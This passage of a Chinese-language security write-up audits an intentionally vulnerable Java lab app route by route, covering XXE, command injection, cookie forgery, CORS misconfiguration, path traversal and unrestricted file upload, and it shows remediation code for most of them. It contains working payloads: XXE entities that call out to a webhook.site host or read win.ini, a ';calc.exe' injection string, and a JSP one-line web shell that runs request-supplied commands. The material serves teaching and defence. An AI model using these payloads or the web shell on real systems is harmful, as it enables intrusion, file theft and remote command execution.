+<td>结合了 SAX 的高效性和 JDOM 的易用性</td>
+<td>解析速度依赖于 SAX，灵活性低于 DOM</td>
+</tr>
+<tr>
+<td>SAXReader&#96;</td>
+<td>Dom4j 中基于 SAX 的解析器</td>
+<td>需要 Dom4j 进行 XML 操作时</td>
+<td>高效且灵活，支持树结构</td>
+<td>性能略逊于纯 SAX</td>
+</tr>
+<tr>
+<td><code>SAXParser</code></td>
+<td>Java 中的 SAX 解析器</td>
+<td>基于事件驱动的解析，适合处理大型 XML 文件</td>
+<td>高效，内存占用小</td>
+<td>解析复杂 XML 需要手动处理回调</td>
+</tr>
+<tr>
+<td>Digester&#96;</td>
+<td>基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供）</td>
+<td>需要将 XML 映射为 Java 对象时</td>
+<td>简化 XML 与 Java 对象的映射</td>
+<td>对大文件不友好，灵活性较低</td>
+</tr>
+<tr>
+<td>DocumentBuilder&#96;</td>
+<td>Java 中 DOM 解析器，用于构建树状结构</td>
+<td>需要完整树结构操作，如修改和多次遍历 XML 文件</td>
+<td>完整保留文档结构，易于查找和修改</td>
+<td>内存占用较大，处理大文件时性能较差</td>
+</tr>
+<tr>
+<td><code>DocumentHelper</code></td>
+<td>Dom4j 提供的辅助类，用于快速创建和操作 XML 文档</td>
+<td>需要手动构建和操作 XML 文档时</td>
+<td>快速创建和处理 XML 文档，灵活性高</td>
+<td>内存占用较大，处理超大文件时性能不佳</td>
+</tr>
+</tbody></table>
+<h4 id="统一漏洞利用payload："><a href="#统一漏洞利用payload：" class="headerlink" title="统一漏洞利用payload："></a>统一漏洞利用payload：</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/bef89c10-3850-4342-8f7e-934073c0cc12&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</code></pre>
+<p>POST传入：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008105859368.png" alt="image-20241008105859368"></p>
+<p>接收到DNSLOG</p>
+<p><img src="C:\Users\ttycp3\AppData\Roaming\Typora\typora-user-images\image-20241008105829498.png" alt="image-20241008105829498"></p>
+<h4 id="统一修复代码"><a href="#统一修复代码" class="headerlink" title="统一修复代码"></a>统一修复代码</h4><pre><code class="java">//实例化解析类之后通常会支持着三个配置
+obj.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+obj.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+obj.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+</code></pre>
+<p>禁用了外部实体，限制实体来源。</p>
+<h3 id="10-路由-x2F-xxe-x2F-xmlbeam-x2F-vuln"><a href="#10-路由-x2F-xxe-x2F-xmlbeam-x2F-vuln" class="headerlink" title="10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln"></a>10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</h3><p>漏洞代码：</p>
+<pre><code class="Java">        @PostMapping(value = &quot;/xmlbeam/vuln&quot;)
+        HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123;
+            try &#123;
+                logger.info(user.toString());
+                return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName()));
+            &#125;catch (Exception e)&#123;
+                e.printStackTrace();
+                return ResponseEntity.ok(&quot;error&quot;);
+            &#125;
+        &#125;
+
+        /**
+         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
+         */
+        @ProjectedPayload
+        public interface UserPayload &#123;
+            @XBRead(&quot;//userName&quot;)
+            String getUserName();
+        &#125;
+</code></pre>
+<p>该代码需要使用固定的标签可以实现回显，我们可以构造payload：</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [  
+    &lt;!ENTITY xxe SYSTEM &quot;file:/c:/Windows/win.ini&quot;&gt;  
+]&gt;
+&lt;userPayload&gt;
+    &lt;userName&gt;&amp;xxe;&lt;/userName&gt;
+&lt;/userPayload&gt;
+</code></pre>
+<p>通过抓包上传实现任意文件读取</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008142315473.png" alt="image-20241008142315473"></p>
+<h3 id="11-路由-x2F-ooxml-x2F-readxlsx"><a href="#11-路由-x2F-ooxml-x2F-readxlsx" class="headerlink" title="11.路由&#x2F;ooxml&#x2F;readxlsx"></a>11.路由&#x2F;ooxml&#x2F;readxlsx</h3><p>漏洞代码：</p>
+<pre><code class="Java"> @PostMapping(&quot;/readxlsx&quot;)
+    @ResponseBody
+    public String ooxml_xxe(MultipartFile file) throws IOException &#123;
+        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln
+
+        XSSFSheet sheet = wb.getSheetAt(0);
+        XSSFRow row;
+        XSSFCell cell;
+
+        Iterator rows = sheet.rowIterator();
+        StringBuilder sbResult = new StringBuilder();
+
+        while (rows.hasNext()) &#123;
+
+            row = (XSSFRow) rows.next();
+            Iterator cells = row.cellIterator();
+
+            while (cells.hasNext()) &#123;
+                cell = (XSSFCell) cells.next();
+
+                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) &#123;
+                    sbResult.append(cell.getStringCellValue()).append(&quot; &quot;);
+                &#125; else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) &#123;
+                    sbResult.append(cell.getNumericCellValue()).append(&quot; &quot;);
+                &#125; else &#123;
+                    logger.info(&quot;errors&quot;);
+                &#125;
+            &#125;
+        &#125;
+
+        return sbResult.toString();
+    &#125;
+</code></pre>
+<p>查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009104055332.png" alt="image-20241009104055332"></p>
+<p>用压缩程序打开生成的测试xlsx表格，在[Content_Types].xml文件中插入攻击代码：</p>
+<pre><code class="xml-dtd">&lt;!DOCTYPE test [
+    &lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/423855a2-9152-4556-b8d3-a0450e32819c&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;xxe;&lt;/test&gt;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110131500.png" alt="image-20241009110131500"></p>
+<p>然后压缩为1.zip,改后缀为1.xlsx,上传后实现命令执行</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110238586.png" alt="image-20241009110238586"></p>
+<h3 id="12-路由-x2F-xlsx-streamer-x2F-readxlsx"><a href="#12-路由-x2F-xlsx-streamer-x2F-readxlsx" class="headerlink" title="12.路由&#x2F;xlsx-streamer&#x2F;readxlsx"></a>12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</h3><p>漏洞代码：</p>
+<pre><code class="java"> @PostMapping(&quot;/readxlsx&quot;)
+    public void xllx_streamer_xxe(MultipartFile file) throws IOException &#123;
+        StreamingReader.builder().open(file.getInputStream());
+    &#125;
+</code></pre>
+<p>换了个库，原理payload 同上</p>
+<h2 id="八、命令注入"><a href="#八、命令注入" class="headerlink" title="八、命令注入"></a>八、命令注入</h2><h3 id="1-路由-x2F-codeinject"><a href="#1-路由-x2F-codeinject" class="headerlink" title="1.路由&#x2F;codeinject"></a>1.路由&#x2F;codeinject</h3><p>漏洞代码：</p>
+<pre><code class="java">    @GetMapping(&quot;/codeinject&quot;)
+    public String codeInject(String filepath) throws IOException &#123;
+
+        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    &#125;
+</code></pre>
+<p>传入的filepath参数直接与原命令拼接，可以实现命令注入，构造payload：</p>
+<pre><code>;calc.exe
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144233099.png" alt="image-20241008144233099"></p>
+<h3 id="2-路由-x2F-codeinject-x2F-host"><a href="#2-路由-x2F-codeinject-x2F-host" class="headerlink" title="2.路由&#x2F;codeinject&#x2F;host"></a>2.路由&#x2F;codeinject&#x2F;host</h3><p>漏洞代码：</p>
+<pre><code class="Java">@GetMapping(&quot;/codeinject/host&quot;)
+    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;
+
+        String host = request.getHeader(&quot;host&quot;);
+        logger.info(host);
+        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    &#125;
+</code></pre>
+<p>同样可以实现命令拼接，构造payload：</p>
+<pre><code>;calc.exe
+</code></pre>
+<p>修改host字段实现命令拼接</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144612745.png" alt="image-20241008144612745"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复代码</p>
+<pre><code class="java">    @GetMapping(&quot;/codeinject/sec&quot;)
+    public String codeInjectSec(String filepath) throws IOException &#123;
+        String filterFilePath = SecurityUtil.cmdFilter(filepath);
+        if (null == filterFilePath) &#123;
+            return &quot;Bad boy. I got u.&quot;;
+        &#125;
+        String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;
+        ProcessBuilder builder = new ProcessBuilder(cmdList);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        return WebUtils.convertStreamToString(process.getInputStream());
+    &#125;
+</code></pre>
+<p>cmdFilter函数代码：</p>
+<pre><code class="Java">private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
+   public static String cmdFilter(String input) &#123;
+        if (!FILTER_PATTERN.matcher(input).matches()) &#123;
+            return null;
+        &#125;
+
+        return input;
+    &#125;
+</code></pre>
+<p>限制了参数中的字符，防止命令注入。</p>
+<h2 id="九、Cookie伪造"><a href="#九、Cookie伪造" class="headerlink" title="九、Cookie伪造"></a>九、Cookie伪造</h2><h3 id="1-路由-x2F-cookie-x2F-vuln01"><a href="#1-路由-x2F-cookie-x2F-vuln01" class="headerlink" title="1.路由&#x2F;cookie&#x2F;vuln01"></a>1.路由&#x2F;cookie&#x2F;vuln01</h3><p>漏洞代码：</p>
+<pre><code class="java">    private static String NICK = &quot;nick&quot;;
+
+    @GetMapping(value = &quot;/vuln01&quot;)
+    public String vuln01(HttpServletRequest req) &#123;
+        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="2-路由-x2F-cookie-x2F-vuln02"><a href="#2-路由-x2F-cookie-x2F-vuln02" class="headerlink" title="2.路由&#x2F;cookie&#x2F;vuln02"></a>2.路由&#x2F;cookie&#x2F;vuln02</h3><p>漏洞代码：</p>
+<pre><code class="Java"> @GetMapping(value = &quot;/vuln02&quot;)
+    public String vuln02(HttpServletRequest req) &#123;
+        String nick = null;
+        Cookie[] cookie = req.getCookies();
+
+        if (cookie != null) &#123;
+            nick = getCookie(req, NICK).getValue();  // key code
+        &#125;
+
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="3-路由-x2F-cookie-x2F-vuln03"><a href="#3-路由-x2F-cookie-x2F-vuln03" class="headerlink" title="3.路由&#x2F;cookie&#x2F;vuln03"></a>3.路由&#x2F;cookie&#x2F;vuln03</h3><p>漏洞代码：</p>
+<pre><code class="Java">   @GetMapping(value = &quot;/vuln03&quot;)
+    public String vuln03(HttpServletRequest req) &#123;
+        String nick = null;
+        Cookie cookies[] = req.getCookies();
+        if (cookies != null) &#123;
+            for (Cookie cookie : cookies) &#123;
+                // key code. Equals can also be equalsIgnoreCase.
+                if (NICK.equals(cookie.getName())) &#123;
+                    nick = cookie.getValue();
+                &#125;
+            &#125;
+        &#125;
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="4-路由-x2F-cookie-x2F-vuln04"><a href="#4-路由-x2F-cookie-x2F-vuln04" class="headerlink" title="4.路由&#x2F;cookie&#x2F;vuln04"></a>4.路由&#x2F;cookie&#x2F;vuln04</h3><p>漏洞代码：</p>
+<pre><code class="Java">@GetMapping(value = &quot;/vuln04&quot;)
+    public String vuln04(HttpServletRequest req) &#123;
+        String nick = null;
+        Cookie cookies[] = req.getCookies();
+        if (cookies != null) &#123;
+            for (Cookie cookie : cookies) &#123;
+                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  // key code
+                    nick = cookie.getValue();
+                &#125;
+            &#125;
+        &#125;
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="5-路由-x2F-cookie-x2F-vuln05"><a href="#5-路由-x2F-cookie-x2F-vuln05" class="headerlink" title="5.路由&#x2F;cookie&#x2F;vuln05"></a>5.路由&#x2F;cookie&#x2F;vuln05</h3><p>漏洞代码：</p>
+<pre><code class="Java">   @GetMapping(value = &quot;/vuln05&quot;)
+    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="6-路由-x2F-cookie-x2F-vuln06"><a href="#6-路由-x2F-cookie-x2F-vuln06" class="headerlink" title="6.路由&#x2F;cookie&#x2F;vuln06"></a>6.路由&#x2F;cookie&#x2F;vuln06</h3><p>漏洞代码:</p>
+<pre><code>@GetMapping(value = &quot;/vuln06&quot;)
+    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;
+        return &quot;Cookie nick: &quot; + nick;
+    &#125;
+</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008145950138.png" alt="image-20241008145950138"></p>
+<h2 id="十、CORS"><a href="#十、CORS" class="headerlink" title="十、CORS"></a>十、CORS</h2><p>CORS（跨域资源共享）是用来实现跨域资源访问的，比如有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。</p>
+<h3 id="1-路由-x2F-cors-x2F-vuln-x2F-origin"><a href="#1-路由-x2F-cors-x2F-vuln-x2F-origin" class="headerlink" title="1.路由&#x2F;cors&#x2F;vuln&#x2F;origin"></a>1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</h3><p>漏洞代码：</p>
+<pre><code class="java">    private static String info = &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;
+
+    @GetMapping(&quot;/vuln/origin&quot;)
+    public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;
+        String origin = request.getHeader(&quot;origin&quot;);
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header
+        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie
+        return info;
+    &#125;
+</code></pre>
+<h3 id="2-路由-x2F-cors-x2F-vuln-x2F-setHeader"><a href="#2-路由-x2F-cors-x2F-vuln-x2F-setHeader" class="headerlink" title="2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader"></a>2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</h3><p>漏洞代码：</p>
+<pre><code class="java">@GetMapping(&quot;/vuln/setHeader&quot;)
+    public String vuls2(HttpServletResponse response) &#123;
+        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
+        return info;
+    &#125;
+</code></pre>
+<h3 id="3-路由-x2F-cors-x2F-vuln-x2F-crossOrigin"><a href="#3-路由-x2F-cors-x2F-vuln-x2F-crossOrigin" class="headerlink" title="3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin"></a>3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</h3><p>漏洞代码：</p>
+<pre><code class="Java">    @GetMapping(&quot;*&quot;)
+    @RequestMapping(&quot;/vuln/crossOrigin&quot;)
+    public String vuls3() &#123;
+        return info;
+    &#125;
+</code></pre>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>可通过抓包修改origin字段验证漏洞</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008155935546.png" alt="image-20241008155935546"></p>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><h4 id="（1）限制origin"><a href="#（1）限制origin" class="headerlink" title="（1）限制origin"></a>（1）限制origin</h4><p>防御代码：</p>
+<pre><code class="Java">  @CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)
+    @GetMapping(&quot;/sec/crossOrigin&quot;)
+    public String secCrossOrigin() &#123;
+        return info;
+    &#125;
+</code></pre>
+<h4 id="（2）WebMvcConfigurer设置Cors"><a href="#（2）WebMvcConfigurer设置Cors" class="headerlink" title="（2）WebMvcConfigurer设置Cors"></a>（2）WebMvcConfigurer设置Cors</h4><p>防御代码：</p>
+<pre><code class="Java">  @GetMapping(&quot;/sec/webMvcConfigurer&quot;)
+    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;
+        return token;
+    &#125;
+</code></pre>
+<p>对应过滤器：</p>
+<pre><code class="Java">    public WebMvcConfigurer corsConfigurer() &#123;
+        return new WebMvcConfigurerAdapter() &#123;
+            @Override
+            public void addCorsMappings(CorsRegistry registry) &#123;
+                // 为了支持一级域名，重写了checkOrigin
+                //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;
+                registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**表示所有路由path
+                        //.allowedOrigins(allowOrigins)
+                        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)
+                        .allowCredentials(true);
+            &#125;
+        &#125;;
+    &#125;
+</code></pre>
+<h4 id="（3）spring-security设置cors"><a href="#（3）spring-security设置cors" class="headerlink" title="（3）spring security设置cors"></a>（3）spring security设置cors</h4><p>防御代码：</p>
+<pre><code class="Java">@GetMapping(&quot;/sec/httpCors&quot;)
+public CsrfToken getCsrfToken_02(CsrfToken token) &#123;
+    return token;
+&#125;
+</code></pre>
+<p>对应过滤器：</p>
+<pre><code class="java">    CorsConfigurationSource corsConfigurationSource()
+    &#123;
+        // Set cors origin white list
+        ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();
+        allowOrigins.add(&quot;joychou.org&quot;);
+        allowOrigins.add(&quot;https://test.joychou.me&quot;); // 区分http和https，并且默认不会拦截同域请求。
+
+        CorsConfiguration configuration = new CorsConfiguration();
+        configuration.setAllowedOrigins(allowOrigins);
+        configuration.setAllowCredentials(true);
+        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));
+        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
+        source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style
+        return source;
+    &#125;
+</code></pre>
+<h4 id="（4）自定义filter设置cors"><a href="#（4）自定义filter设置cors" class="headerlink" title="（4）自定义filter设置cors"></a>（4）自定义filter设置cors</h4><p>防御代码：</p>
+<pre><code class="Java">    @GetMapping(&quot;/sec/originFilter&quot;)
+    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;
+        return token;
+    &#125;
+</code></pre>
+<p>对应过滤器：</p>
+<pre><code class="Java">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)
+public class OriginFilter implements Filter &#123;
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException &#123;
+
+    &#125;
+
+    private final Logger logger = LoggerFactory.getLogger(this.getClass());
+
+    @Override
+    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
+            throws IOException, ServletException &#123;
+
+        HttpServletRequest request = (HttpServletRequest) req;
+        HttpServletResponse response = (HttpServletResponse) res;
+
+        String origin = request.getHeader(&quot;Origin&quot;);
+        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());
+
+        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑
+        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
+            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +
+                    &quot;\tCurrent url:&quot; + request.getRequestURL());
+            response.setStatus(response.SC_FORBIDDEN);
+            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);
+            return;
+        &#125;
+
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
+        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
+        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);
+
+        filterChain.doFilter(req, res);
+    &#125;
+</code></pre>
+<h4 id="（5）CorsFilter设置cors"><a href="#（5）CorsFilter设置cors" class="headerlink" title="（5）CorsFilter设置cors"></a>（5）CorsFilter设置cors</h4><p>防御代码：</p>
+<pre><code class="Java"> @RequestMapping(&quot;/sec/corsFilter&quot;)
+    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;
+        return token;
+    &#125;
+</code></pre>
+<p>对应过滤器：</p>
+<pre><code class="Java">public class BaseCorsFilter extends CorsFilter &#123;
+
+    public BaseCorsFilter() &#123;
+        super(configurationSource());
+    &#125;
+
+    private static UrlBasedCorsConfigurationSource configurationSource() &#123;
+        CorsConfiguration config = new CorsConfiguration();
+        config.setAllowCredentials(true);
+        config.addAllowedOrigin(&quot;joychou.org&quot;); // 不支持
+        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);
+        config.addAllowedHeader(&quot;*&quot;);
+        config.addAllowedMethod(&quot;GET&quot;);
+        config.addAllowedMethod(&quot;POST&quot;);
+
+        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
+        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);
+
+        return source;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="（6）origin检查"><a href="#（6）origin检查" class="headerlink" title="（6）origin检查"></a>（6）origin检查</h4><p>防御代码：</p>
+<pre><code class="Java">    @GetMapping(&quot;/sec/checkOrigin&quot;)
+    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;
+        String origin = request.getHeader(&quot;Origin&quot;);
+
+        // 如果origin不为空并且origin不在白名单内，认定为不安全。
+        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
+        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
+            return &quot;Origin is not safe.&quot;;
+        &#125;
+        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
+        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
+        return LoginUtils.getUserInfo2JsonStr(request);
+    &#125;
+</code></pre>
+<h2 id="十一、目录遍历"><a href="#十一、目录遍历" class="headerlink" title="十一、目录遍历"></a>十一、目录遍历</h2><h3 id="1-路由-x2F-path-traversal-x2F-vul"><a href="#1-路由-x2F-path-traversal-x2F-vul" class="headerlink" title="1.路由&#x2F;path_traversal&#x2F;vul"></a>1.路由&#x2F;path_traversal&#x2F;vul</h3><p>漏洞代码：</p>
+<pre><code class="Java">  @GetMapping(&quot;/path_traversal/vul&quot;)
+    public String getImage(String filepath) throws IOException &#123;
+        return getImgBase64(filepath);
+    &#125;
+private String getImgBase64(String imgFile) throws IOException &#123;
+
+        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));
+        logger.info(&quot;File path: &quot; + imgFile);
+
+        File f = new File(imgFile);
+        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;
+            byte[] data = Files.readAllBytes(Paths.get(imgFile));
+            return new String(Base64.encodeBase64(data));
+        &#125; else &#123;
+            return &quot;File doesn&#39;t exist or is not a file.&quot;;
+        &#125;
+    &#125;
+</code></pre>
+<p>存在一个文件读取接口，构造目录遍历拿到base64数据</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163207205.png" alt="image-20241008163207205"></p>
+<p>解码拿到内容：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163241485.png" alt="image-20241008163241485"></p>
+<p>修复代码：</p>
+<pre><code class="Java">    @GetMapping(&quot;/path_traversal/sec&quot;)
+    public String getImageSec(String filepath) throws IOException &#123;
+        if (SecurityUtil.pathFilter(filepath) == null) &#123;
+            logger.info(&quot;Illegal file path: &quot; + filepath);
+            return &quot;Bad boy. Illegal file path.&quot;;
+        &#125;
+        return getImgBase64(filepath);
+    &#125;
+</code></pre>
+<p>pathFilter函数内容：</p>
+<pre><code class="Java"> public static String pathFilter(String filepath) &#123;
+        String temp = filepath;
+
+        // use while to sovle multi urlencode
+        while (temp.indexOf(&#39;%&#39;) != -1) &#123;
+            try &#123;
+                temp = URLDecoder.decode(temp, &quot;utf-8&quot;);
+            &#125; catch (UnsupportedEncodingException e) &#123;
+                logger.info(&quot;Unsupported encoding exception: &quot; + filepath);
+                return null;
+            &#125; catch (Exception e) &#123;
+                logger.info(e.toString());
+                return null;
+            &#125;
+        &#125;
+
+        if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#39;/&#39;) &#123;
+            return null;
+        &#125;
+
+        return filepath;
+    &#125;
+</code></pre>
+<p>对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为&#x2F;字符或者存在..连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。</p>
+<h2 id="十二、文件上传"><a href="#十二、文件上传" class="headerlink" title="十二、文件上传"></a>十二、文件上传</h2><h3 id="1-路由-x2F-file-x2F-upload"><a href="#1-路由-x2F-file-x2F-upload" class="headerlink" title="1.路由&#x2F;file&#x2F;upload"></a>1.路由&#x2F;file&#x2F;upload</h3><pre><code class="java">    @PostMapping(&quot;/upload&quot;)
+    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,
+                                   RedirectAttributes redirectAttributes) &#123;
+        if (file.isEmpty()) &#123;
+            // 赋值给uploadStatus.html里的动态参数message
+            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);
+            return &quot;redirect:/file/status&quot;;
+        &#125;
+
+        try &#123;
+            // Get the file and save it somewhere
+            byte[] bytes = file.getBytes();
+            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
+            Files.write(path, bytes);
+
+            redirectAttributes.addFlashAttribute(&quot;message&quot;,
+                    &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);
+
+        &#125; catch (IOException e) &#123;
+            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);
+            logger.error(e.toString());
+        &#125;
+
+        return &quot;redirect:/file/status&quot;;
+    &#125;
+</code></pre>
+<p>文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：</p>
+<pre><code class="jsp">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008181225763.png" alt="image-20241008181225763"></p>
+<p>修复代码：</p>
+<pre><code class="Java">    @PostMapping(&quot;/upload/picture&quot;)
+    @ResponseBody
+    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;
+        if (multifile.isEmpty()) &#123;
+            return &quot;Please select a file to upload&quot;;
+        &#125;
+
+        String fileName = multifile.getOriginalFilename();
+        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名
+        String mimeType = multifile.getContentType(); // 获取MIME类型
+        String filePath = UPLOADED_FOLDER + fileName;
+        File excelFile = convert(multifile);
+
+
+        // 判断文件后缀名是否在白名单内  校验1
+        String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;
+        boolean suffixFlag = false;
+        for (String white_suffix : picSuffixList) &#123;
+            if (Suffix.toLowerCase().equals(white_suffix)) &#123;
+                suffixFlag = true;
+                break;
+            &#125;
+        &#125;
